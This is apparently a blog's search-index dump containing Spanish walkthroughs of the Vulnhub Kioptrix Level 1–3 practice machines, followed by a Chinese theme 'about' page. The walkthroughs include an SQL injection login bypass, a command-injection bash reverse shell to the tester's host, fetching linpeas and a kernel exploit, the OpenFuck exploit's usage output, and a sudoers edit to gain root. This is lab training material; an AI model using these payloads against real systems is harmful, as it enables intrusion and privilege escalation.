loneferret:starwars una vez obtenida las credenciales pasamos a conectarnos a través de SSH pero obtenemos un error. Para solucionarlo escribimos lo siguiente para conectarnos: ssh -oHostKeyAlgorithms=+ssh-dss loneferret@192.168.66.161 ","date":"2023-08-25","objectID":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_3/:1:2","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 3 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_3/"},{"categories":["Vulnhub"],"content":"Escalada de Privilegios Si leemos el fichero CompanyPolicy.README nos dice que han instalado un nuevo software para editar, crear y ver archivos y que para ello utilicemos el comando “sudo ht”. Con sudo -l vemos que tenemos permisos para ejecutarlo con sudo. si lo ejecutamos de primeras nos saltara un error por lo que tenemos que ejecutar lo siguiente: export TERM=xterm y ejecutamos: sudo ht Para abrir un fichero debemos de utilizar las teclas ALT+ F y seleccionar el campo open: Vamos a editar el fichero /etc/sudoers para poder lanzar una Shell como root y así escalar privilegios. Para ello escribimos /etc/sudoers y damos al enter. Añadimos el siguiente comando seguido de los comandos existentes al usuario loneferret para que pueda ejecutarlo con sudo. , bin/sh Pulsamos ALT + F guardamos y salimos. Obtenemos una Shell como root: loneferret@Kioptrix3:~$ sudo sh # whoami root Un saludo y Feliz Hacking :) ","date":"2023-08-25","objectID":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_3/:1:3","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 3 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_3/"},{"categories":["Vulnhub"],"content":"Kioptrix Level 2 ","date":"2023-08-22","objectID":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_2/:0:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 2 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_2/"},{"categories":["Vulnhub"],"content":"Instalación Por defecto la maquina tiene configurada la tarjeta de red en modo Bridged y no es recomendable por lo que debemos de configurarla en modo NAT que tiene que ser la misma interfaz que nuestro Kali. Para ello antes de abrir la maquina en nuestro VMware nos dirigimos al archivo de configuración. lo abrimos con nuestro editor de texto y cambiamos el nombre de la red por NAT #cambiamos ethernet0.networkName = \"Bridged\" #Por ethernet0.networkName = \"NAT\" Después abrimos la maquina desde VMware y cambiamos la interfaz de red por NAT Iniciamos y nos aparecerán una serie de ventanas en las cuales debemos seleccionar “Do Nothing” en todas hasta que termine de iniciarse la maquina. Y deberíamos de tener la maquina lista para comenzar. ","date":"2023-08-22","objectID":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_2/:1:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 2 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_2/"},{"categories":["Vulnhub"],"content":"Resolución de la Maquina ","date":"2023-08-22","objectID":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_2/:2:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 2 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_2/"},{"categories":["Vulnhub"],"content":"Escaneo y Análisis de Vulnerabilidades Iniciamos con un escaneo con el comando arp para obtener la ip de nuestra maquina. sudo arp-scan -I eth0 --localnet Una vez obtenida nuestra IP pasamos a realizar un escaneo con nmap para descubrir puertos abiertos. nmap -p- --open -T5 -n -Pn -vvv 192.168.66.160 -oN Target Output: Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 16:30 EDT Initiating ARP Ping Scan at 16:30 Scanning 192.168.66.160 [1 port] Completed ARP Ping Scan at 16:30, 0.04s elapsed (1 total hosts) Initiating SYN Stealth Scan at 16:30 Scanning 192.168.66.160 [65535 ports] Discovered open port 111/tcp on 192.168.66.160 Discovered open port 3306/tcp on 192.168.66.160 Discovered open port 22/tcp on 192.168.66.160 Discovered open port 443/tcp on 192.168.66.160 Discovered open port 80/tcp on 192.168.66.160 Discovered open port 996/tcp on 192.168.66.160 Discovered open port 631/tcp on 192.168.66.160 Completed SYN Stealth Scan at 16:30, 4.05s elapsed (65535 total ports) Nmap scan report for 192.168.66.160 Host is up, received arp-response (0.0025s latency). Scanned at 2023-08-20 16:30:10 EDT for 4s Not shown: 65528 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 64 80/tcp open http syn-ack ttl 64 111/tcp open rpcbind syn-ack ttl 64 443/tcp open https syn-ack ttl 64 631/tcp open ipp syn-ack ttl 64 996/tcp open xtreelic syn-ack ttl 64 3306/tcp open mysql syn-ack ttl 64 MAC Address: 00:0C:29:60:3D:BB (VMware) Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 4.24 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB) Tras un escaneo general pasamos a realizar otro especificando los puertos descubiertos para ver la versión que corren los servicios. nmap -p22,80,111,443,631,996,3306 -sCV 192.168.66.160 Output: Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 16:31 EDT Nmap scan report for 192.168.66.160 Host is up (0.00015s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 3.9p1 (protocol 1.99) |_sshv1: Server supports SSHv1 | ssh-hostkey: | 1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1) | 1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA) |_ 1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA) 80/tcp open http Apache httpd 2.0.52 ((CentOS)) |_http-server-header: Apache/2.0.52 (CentOS) |_http-title: Site doesn't have a title (text/html; charset=UTF-8). 111/tcp open rpcbind 2 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 993/udp status |_ 100024 1 996/tcp status 443/tcp open ssl/http Apache httpd 2.0.52 ((CentOS)) |_http-title: Site doesn't have a title (text/html; charset=UTF-8). | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- | Not valid before: 2009-10-08T00:10:47 |_Not valid after: 2010-10-08T00:10:47 |_ssl-date: 2023-08-20T17:22:36+00:00; -3h09m37s from scanner time. |_http-server-header: Apache/2.0.52 (CentOS) | sslv2: | SSLv2 supported | ciphers: | SSL2_RC2_128_CBC_WITH_MD5 | SSL2_RC4_64_WITH_MD5 | SSL2_DES_192_EDE3_CBC_WITH_MD5 | SSL2_RC4_128_EXPORT40_WITH_MD5 | SSL2_RC2_128_CBC_EXPORT40_WITH_MD5 | SSL2_DES_64_CBC_WITH_MD5 |_ SSL2_RC4_128_WITH_MD5 631/tcp open ipp CUPS 1.1 |_http-server-header: CUPS/1.1 |_http-title: 403 Forbidden | http-methods: |_ Potentially risky methods: PUT 996/tcp open status 1 (RPC #100024) 3306/tcp open mysql MySQL (unauthorized) MAC Address: 00:0C:29:60:3D:BB (VMware) Host script results: |_clock-skew: -3h09m37s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.28 seconds ","date":"2023-08-22","objectID":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_2/:2:1","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 2 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_2/"},{"categories":["Vulnhub"],"content":"Explotación Tras analizar el resultado vemos que tiene el puerto 80 abierto con el servicio http por lo que pasamos a ver la web. Observamos un login con los campos Username y Password. Probamos a realizar un comando basico de SQLInjection en el campo Username ' or 1 = 1 -- - Y tenemos éxito apareciendo después la siguiente ventana: Observamos que tiene la función de realizar un ping a la ip que le indiquemos. Si escribimos la ip de la maquina obtenemos lo siguiente: Probamos a concatenar comandos con un “;” y vemos que se pueden concatenar: 192.168.66.160 ; whoami obteniendo: Una vez aquí nos ponemos a la escucha en nuestro kali y ejecutamos el siguiente comando para obtener una reverse Shell #kali nc -nlvp 4444 #En la web 192.168.66.152 ; bash -i \u003e\u0026 /dev/tcp/192.168.66.152/4444 0\u003e\u00261 obteniendo la Shell: ┌──(kali㉿kali)-[~] └─$ nc -nlvp 4444 listening on [any] 4444 ... connect to [192.168.66.152] from (UNKNOWN) [192.168.66.160] 32779 bash: no job control in this shell bash-3.00$ whoami apache ","date":"2023-08-22","objectID":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_2/:2:2","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 2 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_2/"},{"categories":["Vulnhub"],"content":"Escalada de privilegios Transferimos linpeas.sh de nuestro Kali a la maquina para ver por donde podemos escalar privilegios para ello iniciamos un servidor con Python en nuestro kali: python3 -m http.server 80 y con wget desde la maquina descargamos Linpeas. wget http://192.168.66.152/linpeas.sh Una vez con Linpeas en la maquina objetivo lo ejecutamos y vemos lo siguiente: La maquina es un CentOS 4.5 con versión de Linux 2.6.9. Buscamos en Google si existe algún exploit de escalada de privilegios con estas características y encontramos el siguiente exploit: https://www.exploit-db.com/exploits/9542 Lo descargamos en nuestra maquina y lo transferimos igual que hemos hecho anteriormente. Lo compilamos gcc 9542.c -o exploit Damos permisos de ejecución chmod +x exploit y lo ejecutamos obteniendo una Shell como root bash-3.00$ ./exploit sh: no job control in this shell sh-3.00# whoami root y ya tendríamos la maquina terminada. Un saludo y Feliz Hacking :) ","date":"2023-08-22","objectID":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_2/:2:3","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 2 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_2/"},{"categories":["Vulnhub"],"content":"Kioptrix: Level 1 ","date":"2023-08-14","objectID":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_1/:0:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 1 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_1/"},{"categories":["Vulnhub"],"content":"Instalación Si iniciamos la maquina por defecto la tarjeta de red esta en modo brigded y esto no es para nada recomendable por lo que debemos cambiarlo a modo NAT para ello debemos ir al archivo de configuración ubicado en la carpeta de la maquina Buscamos Donde ponga Brigded y lo cambiamos por NAT #cambiar ethernet0.networkName = \"Bridged\" #por ethernet0.networkName = \"NAT\" Después configuramos nuestra tarjeta de red como NAT e iniciamos. ","date":"2023-08-14","objectID":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_1/:1:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 1 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_1/"},{"categories":["Vulnhub"],"content":"Resolución de Maquina ","date":"2023-08-14","objectID":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_1/:2:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 1 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_1/"},{"categories":["Vulnhub"],"content":"Analisis de vulnerabilidades Empezamos con un escaneo a la red local a través de arp-scan. Introducimos la interfaz (eth0) que se comunica con la maquina Kioptrix. arp-scan -I eth0 --localnet A continuación realizamos un escaneo con nmap. nmap -p- --open -T5 -n -Pn -vvv 192.168.66.158 -oN Target Tras un primer escaneo pasamos a realizar otro para ver la versión de los servicios de los puertos abiertos. nmap -p22,80,111,139,443,1024 -sCV 192.168.66.158 Output: Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-10 17:57 EDT Nmap scan report for 192.168.66.158 Host is up (0.00024s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 2.9p2 (protocol 1.99) |_sshv1: Server supports SSHv1 | ssh-hostkey: | 1024 b8746cdbfd8be666e92a2bdf5e6f6486 (RSA1) | 1024 8f8e5b81ed21abc180e157a33c85c471 (DSA) |_ 1024 ed4ea94a0614ff1514ceda3a80dbe281 (RSA) 80/tcp open http Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b) |_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b |_http-title: Test Page for the Apache Web Server on Red Hat Linux | http-methods: |_ Potentially risky methods: TRACE 111/tcp open rpcbind 2 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 1024/tcp status |_ 100024 1 1024/udp status 139/tcp open netbios-ssn Samba smbd (workgroup: MYGROUP) 443/tcp open ssl/https Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b |_ssl-date: 2023-08-10T22:00:06+00:00; +1m50s from scanner time. |_http-title: 400 Bad Request |_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b | sslv2: | SSLv2 supported | ciphers: | SSL2_DES_192_EDE3_CBC_WITH_MD5 | SSL2_RC2_128_CBC_WITH_MD5 | SSL2_RC4_128_WITH_MD5 | SSL2_RC2_128_CBC_EXPORT40_WITH_MD5 | SSL2_DES_64_CBC_WITH_MD5 | SSL2_RC4_128_EXPORT40_WITH_MD5 |_ SSL2_RC4_64_WITH_MD5 | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- | Not valid before: 2009-09-26T09:32:06 |_Not valid after: 2010-09-26T09:32:06 1024/tcp open status 1 (RPC #100024) MAC Address: 00:0C:29:7C:3A:16 (VMware) Host script results: |_clock-skew: 1m49s |_smb2-time: Protocol negotiation failed (SMB2) |_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: \u003cunknown\u003e, NetBIOS MAC: 000000000000 (Xerox) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.02 seconds Nos fijamos que tiene los puertos 80 Y 443 abiertos, y que tiene una versión de apache 1.3.20 con una versión mod_ssl de 2.8.4. Pasamos a ver las webs con el navegador http://192.168.66.158 Tras una revisión a la web y a su código fuente no encontramos nada de interés por lo que pasamos a revisar la web con el puerto 443. http://192.168.66.158:443 Tampoco se ve nada interesante. A continuación he realizado un ataque de fuerza bruta a directorios con gobuster. gobuster dir -u \"http://192.168.66.158/\" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt Output: =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.66.158/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/08/10 17:55:28 Starting gobuster in directory enumeration mode =============================================================== /manual (Status: 301) [Size: 294] [--\u003e http://127.0.0.1/manual/] /usage (Status: 301) [Size: 293] [--\u003e http://127.0.0.1/usage/] /mrtg (Status: 301) [Size: 292] [--\u003e http://127.0.0.1/mrtg/] Progress: 219977 / 220561 (99.","date":"2023-08-14","objectID":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_1/:2:1","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 1 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_1/"},{"categories":["Vulnhub"],"content":"Explotacion Ejecutamos el exploit ./OpenFuck Output ./OpenFuck ******************************************************************* * OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open * ******************************************************************* * by SPABAM with code of Spabam - LSD-pl - SolarEclipse - CORE * * #hackarena irc.brasnet.org * * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname * * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam * * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ * ******************************************************************* : Usage: ./OpenFuckV2 target box [port] [-c N] target - supported box eg: 0x00 box - hostname or IP address port - port for ssl connection -c open N connections. (use range 40-50 if u dont know) Supported OffSet: 0x00 - Caldera OpenLinux (apache-1.3.26) 0x01 - Cobalt Sun 6.0 (apache-1.3.12) 0x02 - Cobalt Sun 6.0 (apache-1.3.20) 0x03 - Cobalt Sun x (apache-1.3.26) 0x04 - Cobalt Sun x Fixed2 (apache-1.3.26) 0x05 - Conectiva 4 (apache-1.3.6) 0x06 - Conectiva 4.1 (apache-1.3.9) 0x07 - Conectiva 6 (apache-1.3.14) 0x08 - Conectiva 7 (apache-1.3.12) 0x09 - Conectiva 7 (apache-1.3.19) 0x0a - Conectiva 7/8 (apache-1.3.26) 0x0b - Conectiva 8 (apache-1.3.22) 0x0c - Debian GNU Linux 2.2 Potato (apache_1.3.9-14.1) 0x0d - Debian GNU Linux (apache_1.3.19-1) 0x0e - Debian GNU Linux (apache_1.3.22-2) 0x0f - Debian GNU Linux (apache-1.3.22-2.1) 0x10 - Debian GNU Linux (apache-1.3.22-5) 0x11 - Debian GNU Linux (apache_1.3.23-1) 0x12 - Debian GNU Linux (apache_1.3.24-2.1) 0x13 - Debian Linux GNU Linux 2 (apache_1.3.24-2.1) 0x14 - Debian GNU Linux (apache_1.3.24-3) 0x15 - Debian GNU Linux (apache-1.3.26-1) 0x16 - Debian GNU Linux 3.0 Woody (apache-1.3.26-1) 0x17 - Debian GNU Linux (apache-1.3.27) 0x18 - FreeBSD (apache-1.3.9) 0x19 - FreeBSD (apache-1.3.11) 0x1a - FreeBSD (apache-1.3.12.1.40) 0x1b - FreeBSD (apache-1.3.12.1.40) 0x1c - FreeBSD (apache-1.3.12.1.40) 0x1d - FreeBSD (apache-1.3.12.1.40_1) 0x1e - FreeBSD (apache-1.3.12) 0x1f - FreeBSD (apache-1.3.14) 0x20 - FreeBSD (apache-1.3.14) 0x21 - FreeBSD (apache-1.3.14) 0x22 - FreeBSD (apache-1.3.14) 0x23 - FreeBSD (apache-1.3.14) 0x24 - FreeBSD (apache-1.3.17_1) 0x25 - FreeBSD (apache-1.3.19) 0x26 - FreeBSD (apache-1.3.19_1) 0x27 - FreeBSD (apache-1.3.20) 0x28 - FreeBSD (apache-1.3.20) 0x29 - FreeBSD (apache-1.3.20+2.8.4) 0x2a - FreeBSD (apache-1.3.20_1) 0x2b - FreeBSD (apache-1.3.22) 0x2c - FreeBSD (apache-1.3.22_7) 0x2d - FreeBSD (apache_fp-1.3.23) 0x2e - FreeBSD (apache-1.3.24_7) 0x2f - FreeBSD (apache-1.3.24+2.8.8) 0x30 - FreeBSD 4.6.2-Release-p6 (apache-1.3.26) 0x31 - FreeBSD 4.6-Realease (apache-1.3.26) 0x32 - FreeBSD (apache-1.3.27) 0x33 - Gentoo Linux (apache-1.3.24-r2) 0x34 - Linux Generic (apache-1.3.14) 0x35 - Mandrake Linux X.x (apache-1.3.22-10.1mdk) 0x36 - Mandrake Linux 7.1 (apache-1.3.14-2) 0x37 - Mandrake Linux 7.1 (apache-1.3.22-1.4mdk) 0x38 - Mandrake Linux 7.2 (apache-1.3.14-2mdk) 0x39 - Mandrake Linux 7.2 (apache-1.3.14) 2 0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk) 0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk) 0x3c - Mandrake Linux 7.2 (apache-1.3.22-1.3mdk) 0x3d - Mandrake Linux 7.2 (apache-1.3.22-10.2mdk) 0x3e - Mandrake Linux 8.0 (apache-1.3.19-3) 0x3f - Mandrake Linux 8.1 (apache-1.3.20-3) 0x40 - Mandrake Linux 8.2 (apache-1.3.23-4) 0x41 - Mandrake Linux 8.2 #2 (apache-1.3.23-4) 0x42 - Mandrake Linux 8.2 (apache-1.3.24) 0x43 - Mandrake Linux 9 (apache-1.3.26) 0x44 - RedHat Linux ?.? GENERIC (apache-1.3.12-1) 0x45 - RedHat Linux TEST1 (apache-1.3.12-1) 0x46 - RedHat Linux TEST2 (apache-1.3.12-1) 0x47 - RedHat Linux GENERIC (marumbi) (apache-1.2.6-5) 0x48 - RedHat Linux 4.2 (apache-1.1.3-3) 0x49 - RedHat Linux 5.0 (apache-1.2.4-4) 0x4a - RedHat Linux 5.1-Update (apache-1.2.6) 0x4b - RedHat Linux 5.1 (apache-1.2.6-4) 0x4c - RedHat Linux 5.2 (apache-1.3.3-1) 0x4d - RedHat Linux 5.2-Update (apache-1.3.14-2.5.x) 0x4e - RedHat Linux 6.0 (apache-1.","date":"2023-08-14","objectID":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_1/:2:2","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 1 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_1/"},{"categories":null,"content":"关于 LoveIt","date":"2019-08-02","objectID":"/antu97-6.github.io/AnTu97-6x/about/","tags":null,"title":"关于 LoveIt","uri":"/antu97-6.github.io/AnTu97-6x/about/"},{"categories":null,"content":"  LoveIt 是一个由  Dillon 开发的简洁、优雅且高效的 Hugo 博客主题。 它的原型基于 LeaveIt 主题 和 KeepIt 主题。 Hugo 主题 LoveIt ","date":"2019-08-02","objectID":"/antu97-6.github.io/AnTu97-6x/about/:0:0","tags":null,"title":"关于 LoveIt","uri":"/antu97-6.github.io/AnTu97-6x/about/"},{"categories":null,"content":"特性 ","date":"2019-08-02","objectID":"/antu97-6.github.io/AnTu97-6x/about/:1:0","tags":null,"title":"关于 LoveIt","uri":"/antu97-6.github.io/AnTu97-6x/about/"},{"categories":null,"content":"性能和 SEO  性能优化：在 Google PageSpeed Insights 中， 99/100 的移动设备得分和 100/100 的桌面设备得分  使用基于 JSON-LD 格式 的 SEO SCHEMA 文件进行 SEO 优化  支持 Google Analytics  支持 Fathom Analytics  支持 Plausible Analytics  支持 Yandex Metrica  支持搜索引擎的网站验证 (Google, Bind, Yandex and Baidu)  支持所有第三方库的 CDN  基于 lazysizes 自动转换图片为懒加载 ","date":"2019-08-02","objectID":"/antu97-6.github.io/AnTu97-6x/about/:1:1","tags":null,"title":"关于 LoveIt","uri":"/antu97-6.github.io/AnTu97-6x/about/"},{"categories":null,"content":"外观和布局  桌面端/移动端 响应式布局  浅色/深色 主题模式  全局一致的设计语言  支持分页  易用和自动展开的文章目录  支持多语言和国际化  美观的 CSS 动画 社交和评论系统  支持 Gravatar 头像  支持本地头像  支持多达 73 种社交链接  支持多达 24 种网站分享  支持 Disqus 评论系统  支持 Gitalk 评论系统  支持 Valine 评论系统  支持 Facebook comments 评论系统  支持 Telegram comments 评论系统  支持 Commento 评论系统  支持 utterances 评论系统  支持 giscus 评论系统 ","date":"2019-08-02","objectID":"/antu97-6.github.io/AnTu97-6x/about/:1:2","tags":null,"title":"关于 LoveIt","uri":"/antu97-6.github.io/AnTu97-6x/about/"},{"categories":null,"content":"扩展功能  支持基于 Lunr.js 或 algolia 的搜索  支持 Twemoji  支持代码高亮  一键复制代码到剪贴板  支持基于 lightGallery 的图片画廊  支持 Font Awesome 图标的扩展 Markdown 语法  支持上标注释的扩展 Markdown 语法  支持分数的扩展 Markdown 语法  支持基于 $\\KaTeX$ 的数学公式  支持基于 mermaid 的图表 shortcode  支持基于 ECharts 的交互式数据可视化 shortcode  支持基于 Mapbox GL JS 的 Mapbox shortcode  支持基于 APlayer 和 MetingJS 的音乐播放器 shortcode  支持 Bilibili 视频 shortcode  支持多种注释的 shortcode  支持自定义样式的 shortcode  支持自定义脚本的 shortcode  支持基于 TypeIt 的打字动画 shortcode  支持基于 cookieconsent 的 Cookie 许可横幅  支持人物标签的 shortcode … ","date":"2019-08-02","objectID":"/antu97-6.github.io/AnTu97-6x/about/:1:3","tags":null,"title":"关于 LoveIt","uri":"/antu97-6.github.io/AnTu97-6x/about/"},{"categories":null,"content":"许可协议 LoveIt 根据 MIT 许可协议授权。 更多信息请查看 LICENSE 文件。 ","date":"2019-08-02","objectID":"/antu97-6.github.io/AnTu97-6x/about/:2:0","tags":null,"title":"关于 LoveIt","uri":"/antu97-6.github.io/AnTu97-6x/about/"},{"categories":null,"content":"特别感谢 LoveIt 主题中用到了以下项目，感谢它们的作者： normalize.css Font Awesome Simple Icons Animate.css autocomplete Lunr.js algoliasearch lazysizes object-fit-images Twemoji emoji-data lightGallery clipboard.js Sharer.js TypeIt $\\KaTeX$ mermaid ECharts Mapbox GL JS APlayer MetingJS Gitalk Valine cookieconsent ","date":"2019-08-02","objectID":"/antu97-6.github.io/AnTu97-6x/about/:3:0","tags":null,"title":"关于 LoveIt","uri":"/antu97-6.github.io/AnTu97-6x/about/"}]